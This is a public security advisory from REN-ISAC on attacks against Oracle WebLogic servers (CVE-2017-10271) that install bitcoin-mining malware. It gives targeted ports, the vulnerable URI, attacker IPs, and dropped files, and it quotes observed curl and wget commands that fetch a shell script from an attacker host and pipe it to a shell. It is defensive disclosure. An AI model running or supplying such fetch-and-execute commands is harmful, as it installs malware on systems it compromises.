Oracle WebLogic Vulnerability Being Exploited by Bitcoin Miners
Audience: IT Executives and Technical Staff; TLP:WHITE (Public Distribution)

EXECUTIVE SUMMARY
REN-ISAC has received widespread reports from university and research institutions about Oracle
WebLogic vulnerabilit(ies) exploited by attackers to run bitcoin mining malware. The first reported
observation was December 13, 2017; malicious activity continues through to the date of this Advisory.
Oracle WebLogic Server is an enterprise Java EE web application server. Typical applications, used in the
higher education and research communities, that rely on WebLogic Server include PeopleSoft, Banner,
Oracle Identity Manager, and locally-developed applications.
One or more of the Oracle WebLogic vulnerabilities listed below are suspected to be in use by the
attackers. They are listed in reverse chronological order by the associated Oracle patch. NOTE:
Regarding the most recent, CVE-2017-10271, rated CRITICAL, with patch availability of October 2017;
because of complexity of patching business-critical Oracle systems, there are possibly many systems
without the October 2017 patches applied. Concerning CVE-2017-10271, the National Vulnerability
Database states: "Easily exploitable vulnerability allows unauthenticated attacker with network access
via HTTP to compromise Oracle WebLogic Server. Successful attacks of this vulnerability can result in
takeover of Oracle WebLogic Server."
NIST NVD CVE-2017-10271 Detail: https://nvd.nist.gov/vuln/detail/CVE-2017-10271
BREACH REPORTING CONSIDERATIONS: So far, affected sites have no evidence of loss or exposure of
records; evaluation on this will continue.
RECOMMENDATION: Apply Oracle patches covering the CVEs reported below and review the timeliness
and thoroughness of your patching process.

TECHNICAL DETAILS
Prior to an actual attack your address space may be scanned for targets. Target ports include but are not
limited to: TCP/80, 443, 7001, 8080, 8888, 9000.
IP addresses and domain names observed to be involved in the malicious activity are listed below.
To execute the initial attack a WebLogic Server URI is hit, commonly /wls-wsat/CoordinatorPortType.
Various URIs confirmed vulnerable to CVE-2017-10271 are listed below.
Miners dropped onto compromised systems include:

Additional Miscellaneous Indications
On a compromised WebLogic server, the following has been seen to initiate mining:
curl -s http[:]//165.227.215[.]212:8220/logo5.jpg | bash –s
logo5.jpg is a shell script
addresses seen in the script include:

More than one reporter indicated affected servers running high CPU usage.
More than one reporter indicated compromised machines talking back to IPs at destination port
TCP/8220.
One reporter: Each of 3 compromised systems were talking back to 67.21.81.179:8220. The one not
doing the BTC mining had an inbound SSH connection from 58.218.198.162:45987.
Source & URL requested on the two servers doing the BTC mining:
35.194.156.203 requested: /wls-wsat/CoordinatorPortType
These URLS were requested by systems that were doing the BTC mining:
35.194.156.203:80/config_1.json
35.194.156.203:80/gcc
35.194.156.203:80/ftw.sh

One reporter: A process masqueraded as wipefs proved to be miner malware. The malware was
originally downloaded to /tmp on 12/18 as a file named “vget”. The system also had a crontab running
that would start the malicous process every six hours.
One reporter: On one system they dropped by jvs and vps:
$ll /var/tmp
total 5832
-rw-r--r-- 1 psoft psft 450 Dec 26 02:57 config.json
-rwxrwxrwx 1 psoft psft 2979640 Dec 20 11:32 jvs
-rwxrwxrwx 1 psoft psft 2979640 Dec 26 02:57 vps
$ps -ef | grep vps
psoft 38837 1 99 2017 ?
8-18:45:33 ./vps -c config.json -t 3
One reporter: Eight servers were compromised on the 23rd and 24th of December. Two things caught
attention: high CPU usage, and all of the crontab entries were removed and replaced with wget –q
http[:]//67.21.81[.]179:8220/logo4.jpg -O - | sh. Several VPS files were discovered in the tmp directory
on each of the 8 servers.
